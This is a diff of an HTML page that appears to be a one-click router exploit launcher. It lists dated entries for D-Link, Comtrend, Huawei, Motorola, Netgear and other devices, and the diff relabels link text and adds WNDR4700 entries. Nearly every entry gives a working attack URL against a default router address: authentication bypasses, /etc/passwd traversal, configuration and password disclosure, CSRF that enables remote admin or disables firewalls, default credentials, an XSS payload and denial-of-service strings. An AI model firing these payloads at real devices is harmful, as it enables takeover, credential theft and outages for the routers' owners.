-	<div><a href="javascript:dns320r();">[IP]</a></div>
+	<div><a href="javascript:dns320r();">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/08/12</div>
 	<div><a href="http://www.securityfocus.com/bid/50902/info">[+]</a></div>
 	<div><a href="http://192.168.0.1/cgi-bin/discovery.cgi">DNS-320 DNS-325 information disclosure</a></div>
-	<div><a href="javascript:setip('/cgi-bin/discovery.cgi');">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/discovery.cgi');">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/08/12</div>
 	<div><a href="http://www.securityfocus.com/bid/50902/info">[+]</a></div>
 	<div><a href="http://192.168.0.1/cgi-bin/system_mgr.cgi?cmd=get_firm_v_xml">DNS-320 DNS-325 information disclosure</a></div>
-	<div><a href="javascript:setip('/cgi-bin/system_mgr.cgi?cmd=get_firm_v_xml');">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/system_mgr.cgi?cmd=get_firm_v_xml');">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/10/12</div>
 	<div><a href="http://websecurity.com.ua/5567/">[+]</a></div>
 	<div><a href="http://192.168.0.50/index.cgi?res_cmd=20&res_buf=null&res_cmd_type=bl&v2=y&rq=y">DAP-1150 save configuration CSRF</a></div>
-	<div><a href="javascript:setip('/index.cgi?res_cmd=20&res_buf=null&res_cmd_type=bl&v2=y&rq=y');">[IP]</a></div>
+	<div><a href="javascript:setip('/index.cgi?res_cmd=20&res_buf=null&res_cmd_type=bl&v2=y&rq=y');">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/10/12</div>
 	<div><a href="http://websecurity.com.ua/5567/">[+]</a></div>
 	<div><a href="http://192.168.0.50/index.cgi?res_cmd=6&res_buf=null&res_cmd_type=nbl&v2=y&rq=y">DAP-1150 denial of service</a></div>
-	<div><a href="javascript:setip('/index.cgi?res_cmd=6&res_buf=null&res_cmd_type=nbl&v2=y&rq=y');">[IP]</a></div>
+	<div><a href="javascript:setip('/index.cgi?res_cmd=6&res_buf=null&res_cmd_type=nbl&v2=y&rq=y');">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>12/17/11</div>
 	<div><a href="http://websecurity.com.ua/5581/">[+]</a></div>
 	<div><a href="javascript:dsltpass();">DSL-500T reset password CSRF</a></div>
-	<div><a href="javascript:dsltpassr();">[IP]</a></div>
+	<div><a href="javascript:dsltpassr();">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>12/22/10</div>
 	<div><a href="http://seclists.org/fulldisclosure/2010/Dec/569">[+]</a></div>
 	<div><a href="javascript:wbrpass();">WBR-1310 Authentication Bypass set new password</a></div>
-	<div><a href="javascript:wbrpassr();">[IP]</a></div>
+	<div><a href="javascript:wbrpassr();">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>11/09/10</div>
 	<div><a href="http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf">[+]</a></div>
 	<div><a href="http://192.168.0.1/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0">DIR-615, DIR-320, DIR-300 Authentication Bypass</a></div>
-	<div><a href="javascript:setip('/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0')">[IP]</a></div>
+	<div><a href="javascript:setip('/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/24/10</div>
 	<div><a href="http://www.xakep.ru/post/53057/&usg=ALkJrhi16ib7RRAB69hwUutq9cFmXxCq7w">[+]</a></div>
 	<div><a href="http://192.168.1.1/cgi-bin/webcm?getpage=/etc/passwd">DSL-500T Directory Traversal (post auth)</a></div>
-	<div><a href="javascript:setip('/cgi-bin/webcm?getpage=/etc/passwd');">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/webcm?getpage=/etc/passwd');">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/24/10</div>
 	<div><a href="http://www.xakep.ru/post/53057/&usg=ALkJrhi16ib7RRAB69hwUutq9cFmXxCq7w">[+]</a></div>
 	<div><a href="http://192.168.1.1/cgi-bin/firmwarecfg">DSL-500T old "firmwarecfg" Authentication Bypass</a></div>
-	<div><a href="javascript:setip('/cgi-bin/firmwarecfg')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/firmwarecfg')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/29/10</div>
 	<div><a href="http://www.icysilence.org/?p=413">[+]</a></div>
 	<div><a href="http://192.168.0.50/tools_firmw.htm">DAP-1160 Authentication Bypass</a></div>
-	<div><a href="javascript:setip('/tools_firmw.htm')">[IP]</a></div>
+	<div><a href="javascript:setip('/tools_firmw.htm')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>12/15/09</div>
 	<div><a href="http://www.hiredhacker.com/2009/12/15/d-link-dir-615-remote-exploit/">[+]</a></div>
 	<div><a href="javascript:dirpass();">DIR-615 change password & enable remote admin</a></div>
-	<div><a href="javascript:dirpassr();">[IP]</a></div>
+	<div><a href="javascript:dirpassr();">[SET IP]</a></div>
 </article>
 
 <article>
@@ -1949,35 +2466,35 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>08/25/08</div>
 	<div><a href="http://www.sourcesec.com/Lab/soho_router_report.pdf">[+]</a></div>
 	<div><a href="http://192.168.0.1/Tools/Admin.shtml">DIR-615 configuration disclosure</a></div>
-	<div><a href="javascript:setip('/Tools/Admin.shtml')">[IP]</a></div>
+	<div><a href="javascript:setip('/Tools/Admin.shtml')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>00/00/0?</div>
 	<div><a href="http://packetstormsecurity.org/0306-exploits/dlinkDoS.txt">[+]</a></div>
 	<div><a href="http://192.168.0.1/syslog.htm?D=................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................">704P denial of service</a></div>
-	<div><a href="javascript:setip('/syslog.htm?D=................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................')">[IP]</a></div>
+	<div><a href="javascript:setip('/syslog.htm?D=................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>10/20/06</div>
 	<div><a href="http://www.eazel.es/2006/10/20/d-link-dsl-g624t-several-vulnerabilities/">[+]</a></div>
 	<div><a href="http://192.168.1.1/cgi-bin/webcm?getpage=/./././././././etc/config.xml">DSL-G624T DSL-G604T directory traversal</a></div>
-	<div><a href="javascript:setip('/cgi-bin/webcm?getpage=/./././././././etc/config.xml')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/webcm?getpage=/./././././././etc/config.xml')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/06/06</div>
 	<div><a href="http://www.intruders.org.br/advisories/dlinkpt.txt">[+]</a></div>
 	<div><a href="http://10.0.0.1/cgi-bin/config.cfg">DWL-7x00AP configuration disclosure</a></div>
-	<div><a href="javascript:setip('/cgi-bin/config.cfg')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/config.cfg')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>05/20/05</div>
 	<div><a href="http://secunia.com/advisories/15422/">[+]</a></div>
 	<div><a href="http://192.168.0.1/cgi-bin/firmwarecfg">DSL-502T DSL-504T DSL-562T DSL-G604T "firmwarecfg" Authentication Bypass</a></div>
-	<div><a href="javascript:setip('/cgi-bin/firmwarecfg')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/firmwarecfg')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="comtrend">
@@ -1993,35 +2510,35 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>01/08/12</div>
 	<div><a href="javascript:alert('Busindre')">[+]</a></div>
 	<div><a href="javascript:comtrendip()">CT-53XX CT-5071 CT-56XX Put a local IP in DMZ</a></div>
-	<div><a href="javascript:ncomtrendipr()">[IP]</a></div>
+	<div><a href="javascript:ncomtrendipr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>01/08/12</div>
 	<div><a href="javascript:alert('Busindre')">[+]</a></div>
 	<div><a href="http://192.168.1.1/scsrvcntr.cmd?action=save&ftp=1&ftp=3&http=1&http=3&icmp=1&snmp=1&snmp=3&ssh=1&ssh=3&telnet=1&telnet=3&tftp=1&tftp=3">CT-53XX CT-5071 CT-56XX Enable remote admin</a></div>
-	<div><a href="javascript:setip('http://192.168.1.1/scsrvcntr.cmd?action=save&ftp=1&ftp=3&http=1&http=3&icmp=1&snmp=1&snmp=3&ssh=1&ssh=3&telnet=1&telnet=3&tftp=1&tftp=3')">[IP]</a></div>
+	<div><a href="javascript:setip('http://192.168.1.1/scsrvcntr.cmd?action=save&ftp=1&ftp=3&http=1&http=3&icmp=1&snmp=1&snmp=3&ssh=1&ssh=3&telnet=1&telnet=3&tftp=1&tftp=3')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>11/09/11</div>
 	<div><a href="http://www.exploit-db.com/exploits/18101/">[+]</a></div>
 	<div><a href="javascript:ncomtrendpass()">CT-5624 Change passwords</a></div>
-	<div><a href="javascript:ncomtrendpassr()">[IP]</a></div>
+	<div><a href="javascript:ncomtrendpassr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>03/04/11</div>
 	<div><a href="http://www.exploit-db.com/exploits/16275/">[+]</a></div>
 	<div><a href="javascript:comtrendpass()">CT-5367 Change passwords</a></div>
-	<div><a href="javascript:comtrendpassr()">[IP]</a></div>
+	<div><a href="javascript:comtrendpassr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>03/04/11</div>
 	<div><a href="http://www.exploit-db.com/exploits/16275/">[+]</a></div>
 	<div><a href="http://192.168.1.1/password.cgi">CT-5367 CT-5624 Information Disclosure</a></div>
-	<div><a href="javascript:setip('/password.cgi')">[IP]</a></div>
+	<div><a href="javascript:setip('/password.cgi')">[SET IP]</a></div>
 </article>
 
 <article>
@@ -2034,14 +2551,14 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>03/04/08</div>
 	<div><a href="http://seclists.org/bugtraq/2008/Dec/226">[+]</a></div>
 	<div><a href="http://192.168.0.1/password.html">CT-536 HG-536+ Information Disclosure</a></div>
-	<div><a href="javascript:setip('/password.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/password.html')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>03/04/08</div>
 	<div><a href="http://archives.neohapsis.com/archives/bugtraq/2008-12/0227.html">[+]</a></div>
 	<div><a href="http://192.168.0.1/backupsettings.html">CT-536 HG-536+ Configuration Disclosure</a></div>
-	<div><a href="javascript:setip('/backupsettings.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/backupsettings.html')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="Easybox">
@@ -2065,14 +2582,14 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>08/04/11</div>
 	<div><a href="http://blog.zerial.org">[+]</a></div>
 	<div><a href="http://192.168.1.1:8000/cgi-bin/webproc?getpage=../../../../../../../../../../../../etc/passwd&var:menu=advanced&var:page=dns">HG-110 Local File Include and Directory/Path Traversal</a></div>
-	<div><a href="javascript:setip('/cgi-bin/webproc?getpage=../../../../../../../../../../../../etc/passwd&var:menu=advanced&var:page=dns');">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/webproc?getpage=../../../../../../../../../../../../etc/passwd&var:menu=advanced&var:page=dns');">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/04/11</div>
 	<div><a href="http://blog.zerial.org">[+]</a></div>
 	<div><a href="http://192.168.1.1:8000/cgi-bin/webproc?getpage=%3Cscript%3Ealert%28this%29%3C/script%3E&var:menu=advanced&var:page=dns">HG-110 Cross site scripting</a></div>
-	<div><a href="javascript:setip('/cgi-bin/webproc?getpage=%3Cscript%3Ealert%28this%29%3C/script%3E&var:menu=advanced&var:page=dns')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/webproc?getpage=%3Cscript%3Ealert%28this%29%3C/script%3E&var:menu=advanced&var:page=dns')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section>
@@ -2090,7 +2607,7 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>01/04/13</div>
 	<div><a href="http://www.distribu.net/securite/faille-freebox.php">[+]</a></div>
 	<div><a href="javascript:document.freeboxdos.submit()">V6 Authentication Bypass Reboot</a></div>
-	<div><a href="javascript:freeboxdosr()">[IP]</a></div>
+	<div><a href="javascript:freeboxdosr()">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br>
@@ -2104,19 +2621,19 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>06/14/12</div>
 	<div><a href="http://websec.mx/advisories/view/Evasion_de_autenticacion_en_Huawei_HG866">[+]</a></div>
 	<div><a href="javascript:hg866pass()">HG866 Authentication Bypass</a></div>
-	<div><a href="javascript:hg866passr()">[IP]</a></div>
+	<div><a href="javascript:hg866passr()">[SET IP]</a></div>
 </article>
 <article>
 	<div>06/14/12</div>
 	<div><a href="http://websec.mx/advisories/view/Evasion_de_autenticacion_en_Huawei_HG866">[+]</a></div>
 	<div><a href="javascript:document.hg866dos.submit()">HG866 Denial of service</a></div>
-	<div><a href="javascript:hg866dosr()">[IP]</a></div>
+	<div><a href="javascript:hg866dosr()">[SET IP]</a></div>
 </article>
 <article>
 	<div>01/25/12</div>
 	<div><a href="javascript:alert('ADiaz')">[+]</a></div>
 	<div><a href="javascript:huappp()">HG5XX remote ppp password disclosure</a></div>
-	<div><a href="javascript:huapppr()">[IP]</a></div>
+	<div><a href="javascript:huapppr()">[SET IP]</a></div>
 </article>
 
 <article>
@@ -2130,84 +2647,84 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>0?/0?/10</div>
 	<div><a href="javascript:alert('SHAKA')">[+]</a></div>
 	<div><a href="http://192.168.1.254/Forms/rpADSLMode_1">HG520 rpADSLMode_1 denial of service</a></div>
-	<div><a href="javascript:setip('/Forms/rpADSLMode_1')">[IP]</a></div>
+	<div><a href="javascript:setip('/Forms/rpADSLMode_1')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>10/03/10</div>
 	<div><a href="https://www.underground.org.mx/index.php?topic=26005.0">[+]</a></div>
 	<div><a href="http://SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAA:SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKA@192.168.1.254">HG520 HTTP auth denial of service</a></div>
-	<div><a href="javascript:huados()">[IP]</a></div>
+	<div><a href="javascript:huados()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>05/30/10</div>
 	<div><a href="https://www.underground.org.mx/index.php?topic=25598.0">[+]</a></div>
 	<div><a href="http://192.168.1.254/Forms/rpEthernet_1">HG520 rpEthernet_1 denial of service</a></div>
-	<div><a href="javascript:setip('/Forms/rpEthernet_1')">[IP]</a></div>
+	<div><a href="javascript:setip('/Forms/rpEthernet_1')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>05/29/10</div>
 	<div><a href="http://www.hakim.ws/huawei/HG520_csrf.txt">[+]</a></div>
 	<div><a href="http://192.168.1.254/Forms/rpRManage_1?ACL_active=0">HG520c HG530 enable remote management CSRF</a></div>
-	<div><a href="javascript:setip('/Forms/rpRManage_1?ACL_active=0')">[IP]</a></div>
+	<div><a href="javascript:setip('/Forms/rpRManage_1?ACL_active=0')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>05/16/10</div>
 	<div><a href="http://www.hakim.ws/huawei/HG520c_info.txt">[+]</a></div>
 	<div><a href="http://192.168.1.254/Listadeparametros.html">HG520c HG530 Listadeparametros.html information disclosure</a></div>
-	<div><a href="javascript:setip('/Listadeparametros.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/Listadeparametros.html')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>03/28/10</div>
 	<div><a href="http://www.hakim.ws/huawei/HG520c_DoS.txt">[+]</a></div>
 	<div><a href="http://192.168.1.254/AutoRestart.html">HG520c HG530 AutoRestart.html denial of service & factory reset</a></div>
-	<div><a href="javascript:setip('/AutoRestart.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/AutoRestart.html')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>03/28/10</div>
 	<div><a href="http://www.hakim.ws/huawei/HG520c_DoS.txt">[+]</a></div>
 	<div><a href="http://192.168.1.254/rpLocalDeviceJump.html?index=HAKIM.WS">HG520 LocalDevicejump.html denial of service</a></div>
-	<div><a href="javascript:setip('/rpLocalDeviceJump.html?index=HAKIM.WS')">[IP]</a></div>
+	<div><a href="javascript:setip('/rpLocalDeviceJump.html?index=HAKIM.WS')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/17/10</div>
 	<div><a href="http://netsec.rs/18/huawei-hg510-multiple-vulnerabilities/493/">[+]</a></div>
 	<div><a href="http://192.168.1.1/rebootinfo.cgi">HG510 rebootinfo.cgi denial of service</a></div>
-	<div><a href="javascript:setip('/rebootinfo.cgi')">[IP]</a></div>
+	<div><a href="javascript:setip('/rebootinfo.cgi')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/24/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/9503">[+]</a></div>
 	<div><a href="http://admin:admin@192.168.1.1">SmartAX MT880 default password</a></div>
-	<div><a href="javascript:setipadminadmin()">[IP]</a></div>
+	<div><a href="javascript:setipadminadmin()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>08/24/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/9503">[+]</a></div>
 	<div><a href="javascript:mt880admin()">SmartAX MT880 add administrator account</a></div>
-	<div><a href="javascript:mt880adminr()">[IP]</a></div>
+	<div><a href="javascript:mt880adminr()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>08/24/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/9503">[+]</a></div>
 	<div><a href="http://admin:admin@192.168.1.1/Action?blacklisting_status=1&bl_list=10&attack_status=0&dos_status=0&id=42&max_tcp=25&max_icmp=25&max_host=70">SmartAX MT880 disable firewall/anti-dos w/default pass</a></div>
-	<div><a href="javascript:mt880fw()">[IP]</a></div>
+	<div><a href="javascript:mt880fw()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>00/00/0?</div>
 	<div><a href="http://everlost.nl/kender/zyxel/">[+]</a></div>
 	<div><a href="http://192.168.1.1/rom-0">ZyNOS configuration disclosure</a></div>
-	<div><a href="javascript:setip('/rom-0')">[IP]</a></div>
+	<div><a href="javascript:setip('/rom-0')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="mifi">
@@ -2218,14 +2735,14 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>01/16/10</div>
 	<div><a href="https://twitter.com/#!/adam_baldwin/status/7832400734">[+]</a></div>
 	<div><a href="http://192.168.1.1/config.xml.savefile">2200 Sprint Verizon configuration disclosure</a></div>
-	<div><a href="javascript:setip('/config.xml.savefile')">[IP]</a></div>
+	<div><a href="javascript:setip('/config.xml.savefile')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>01/16/10</div>
 	<div><a href="http://www.securitybydefault.com/2010/01/vulnerabilidad-en-modemrouter-3g.html">[+]</a></div>
 	<div><a href="http://vodafonemobilebroadband.hotspot/config.xml.sav">2352 Vodafone configuration disclosure</a></div>
-	<div><a href="javascript:setip('/config.xml.sav')">[IP]</a></div>
+	<div><a href="javascript:setip('/config.xml.sav')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="motorola">
@@ -2238,171 +2755,199 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>07/22/11</div>
 	<div><a href="javascript:alert('sirdarckcat')">[+]</a></div>
 	<div><a href="javascript:motpas()">SBG900 change admin password</a></div>
-	<div><a href="javascript:motpasr()">[IP]</a></div>
+	<div><a href="javascript:motpasr()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>07/22/11</div>
 	<div><a href="javascript:alert('sirdarckcat')">[+]</a></div>
 	<div><a href="javascript:motfir()">SBG900 turn off firewall</a></div>
-	<div><a href="javascript:motfirr()">[IP]</a></div>
+	<div><a href="javascript:motfirr()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>07/22/11</div>
 	<div><a href="javascript:alert('sirdarckcat')">[+]</a></div>
 	<div><a href="javascript:motrem()">SBG900 enable remote access</a></div>
-	<div><a href="javascript:motremr()">[IP]</a></div>
+	<div><a href="javascript:motremr()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>07/22/11</div>
 	<div><a href="javascript:alert('sirdarckcat')">[+]</a></div>
 	<div><a href="javascript:motdns()">SBG900 disable DHCP & add custom DNS server</a></div>
-	<div><a href="javascript:motdnsr()">[IP]</a></div>
+	<div><a href="javascript:motdnsr()">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="netgear">
 <form name="netdos"></form>
 <h2>Netgear</h2>
-<h3><a href="javascript:img('WN2000RPTv2')">WN2000RPTv2</a>, <a href="javascript:img('FVS318')">FVS318</a>, <a href="javascript:img('DG632')">DG632</a>, <a href="javascript:img('SSL312 VPN')">SSL312 VPN</a>, <a href="javascript:img('WNR2000')">WNR2000</a>, <a href="javascript:img('WNDAP350')">WNDAP350</a>, <a href="javascript:img('WNAP210')">WNAP210</a>, <a href="javascript:img('WG602')">WG602</a>, <a href="javascript:img('WGR614v9')">WGR614v9</a>, <a href="javascript:img('CG3100D')">CG3100D</a>, <a href="javascript:img('RP614v4')">RP614v4</a><a href="javascript:img('DGND3300v2')">DGND3300v2</a>, <a href="javascript:img('WNR2000v2')">WNR2000v2</a>, <a href="javascript:img('DGN1000')">DGN1000</a>, <a href="javascript:img('N300')">N300</a></h3>
+<h3><a href="javascript:img('WNDR4700')">WNDR4700</a>, <a href="javascript:img('WN2000RPTv2')">WN2000RPTv2</a>, <a href="javascript:img('FVS318')">FVS318</a>, <a href="javascript:img('DG632')">DG632</a>, <a href="javascript:img('SSL312 VPN')">SSL312 VPN</a>, <a href="javascript:img('WNR2000')">WNR2000</a>, <a href="javascript:img('WNDAP350')">WNDAP350</a>, <a href="javascript:img('WNAP210')">WNAP210</a>, <a href="javascript:img('WG602')">WG602</a>, <a href="javascript:img('WGR614v9')">WGR614v9</a>, <a href="javascript:img('CG3100D')">CG3100D</a>, <a href="javascript:img('RP614v4')">RP614v4</a><a href="javascript:img('DGND3300v2')">DGND3300v2</a>, <a href="javascript:img('WNR2000v2')">WNR2000v2</a>, <a href="javascript:img('DGN1000')">DGN1000</a>, <a href="javascript:img('N300')">N300</a></h3>
+
+<article>
+	<div>15/04/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="http://192.168.1.1/BRS_success.html">WNDR4700 DLNA server denial of service</a></div>
+	<div><a href="javascript:setip('/BRS_success.html')">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>15/04/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="http://192.168.1.1/BRS_success.html">WNDR4700 Unauthenticated information disclosure</a></div>
+	<div><a href="javascript:setip('/BRS_success.html')">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>15/04/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/netgear_wndr4700.jsp">[+]</a></div>
+	<div><a href="http://192.168.1.1/BRS_03B_haveBackupFile_fileRestore.html">WNDR4700 Authentication bypass</a></div>
+	<div><a href="javascript:setip('/BRS_03B_haveBackupFile_fileRestore.html')">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>12/09/12</div>
 	<div><a href="https://gist.github.com/4246796">[+]</a></div>
 	<div><a href="http://192.168.1.1/cgi-bin/WNR2000XT.log">WN2000RPTv2 Admin Password Disclosure</a></div>
-	<div><a href="javascript:setip('/cgi-bin/WNR2000XT.log')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/WNR2000XT.log')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>28/05/12</div>
 	<div><a href="http://websec.mx/advisories/view/Revelacion_de_informacion_en_Netgear">[+]</a></div>
 	<div><a href="http://192.168.1.1/currentsetting.htm">DGND3300v2, WNR2000v2, DGN1000, N300 information disclosure</a></div>
-	<div><a href="javascript:setip('/currentsetting.htm')">[IP]</a></div>
+	<div><a href="javascript:setip('/currentsetting.htm')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>04/05/11</div>
 	<div><a href="http://osvdb.org/show/osvdb/73422">[+]</a></div>
 	<div><a href="javascript:netbyp()">WNAP210 authentication bypass</a></div>
-	<div><a href="javascript:netbyp()">[IP]</a></div>
+	<div><a href="javascript:netbyp()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>07/22/11</div>
 	<div><a href="http://www.securityfocus.com/bid/48085/exploit">[+]</a></div>
 	<div><a href="javascript:setip('/BackupConfig.php')">WNDAP350, WNAP210 BackupConfig.php config disclosure</a></div>
-	<div><a href="javascript:setip('/BackupConfig.php')">[IP]</a></div>
+	<div><a href="javascript:setip('/BackupConfig.php')">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>08/14/10</div>
 	<div><a href="http://packetstormsecurity.org/files/view/94803/netgearcg3100d-escalate.txt">[+]</a></div>
 	<div><a href="http://192.168.1.1/__SeContents.html">CG3100D privilege escalation</a></div>
-	<div><a href="javascript:setip('/__SeContents.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/__SeContents.html')">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>03/24/10</div>
 	<div><a href="http://zitstif.no-ip.org/?p=284">[+]</a></div>
 	<div><a href="http://192.168.1.1/vgn/jsp/netgear.cfg')">RP614v4 config disclosure</a></div>
-	<div><a href="javascript:netconb()">[IP]</a></div>
+	<div><a href="javascript:netconb()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>08/24/09</div>
 	<div><a href="http://www.enigmagroup.org/exploits/platform/hardware/remote/19162/%22Netgear-WNR2000-FW-1.2.0.8-Information-Disclsoure-Vulnerabilities%22.html">[+]</a></div>
 	<div><a href="javascript:setip('/router-info.htm')">WNR2000 information disclosure</a></div>
-	<div><a href="javascript:setip('/router-info.htm')">[IP]</a></div>
+	<div><a href="javascript:setip('/router-info.htm')">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>08/24/09</div>
 	<div><a href="http://www.enigmagroup.org/exploits/platform/hardware/remote/19162/%22Netgear-WNR2000-FW-1.2.0.8-Information-Disclsoure-Vulnerabilities%22.html">[+]</a></div>
 	<div><a href="javascript:setip('/router-info.htm')">WNR2000 information disclosure</a></div>
-	<div><a href="javascript:setip('/router-info.htm')">[IP]</a></div>
+	<div><a href="javascript:setip('/router-info.htm')">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>08/20/09</div>
 	<div><a href="http://seclists.org/fulldisclosure/2009/Aug/280">[+]</a></div>
 	<div><a href="javascript:setip('/cgi-bin/NETGEAR_WNR2000.cfg')">WNR2000 config disclosure</a></div>
-	<div><a href="javascript:setip('/cgi-bin/NETGEAR_WNR2000.cfg')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/NETGEAR_WNR2000.cfg')">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>06/15/09</div>
 	<div><a href="http://www.tomneaves.co.uk/Netgear_DG632_Authentication_Bypass.txt">[+]</a></div>
 	<div><a href="http://192.168.0.1/gateway/commands/saveconfig.html">DG632 auth bypass (config disclosure)</a></div>
-	<div><a href="javascript:setip('/gateway/commands/saveconfig.html');">[IP]</a></div>
+	<div><a href="javascript:setip('/gateway/commands/saveconfig.html');">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>06/15/09</div>
 	<div><a href="http://www.tomneaves.co.uk/Netgear_DG632_Authentication_Bypass.txt">[+]</a></div>
 	<div><a href="http://192.168.0.1/html/modemmenu.htm">DG632 auth bypass</a></div>
-	<div><a href="javascript:setip('/html/modemmenu.htm');">[IP]</a></div>
+	<div><a href="javascript:setip('/html/modemmenu.htm');">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>06/15/09</div>
 	<div><a href="http://www.tomneaves.co.uk/Netgear_DG632_Remote_DoS.txt">[+]</a></div>
 	<div><a href="javascript:netdos();">DG632 'firmwarecfg' denial of service</a></div>
-	<div><a href="javascript:netdos();">[IP]</a></div>
+	<div><a href="javascript:netdos();">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>11/13/08</div>
 	<div><a href="http://lists.grok.org.uk/pipermail/full-disclosure/2008-November/065619.html">[+]</a></div>
 	<div><a href="http://192.168.1.1/?">WGR614v9 denial of service</a></div>
-	<div><a href="javascript:setip('/?')">[IP]</a></div>
+	<div><a href="javascript:setip('/?')">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>02/27/08</div>
 	<div><a href="http://www.helith.net/txt/netgear_ssl312_remote_dos.txt">[+]</a></div>
 	<div><a href="javascript:setip('/cgi-bin/welcome/VPN_only?../../../../../')">SSL312 VPN denial of service</a></div>
-	<div><a href="javascript:setip('/cgi-bin/welcome/VPN_only?../../../../../')">[IP]</a></div>
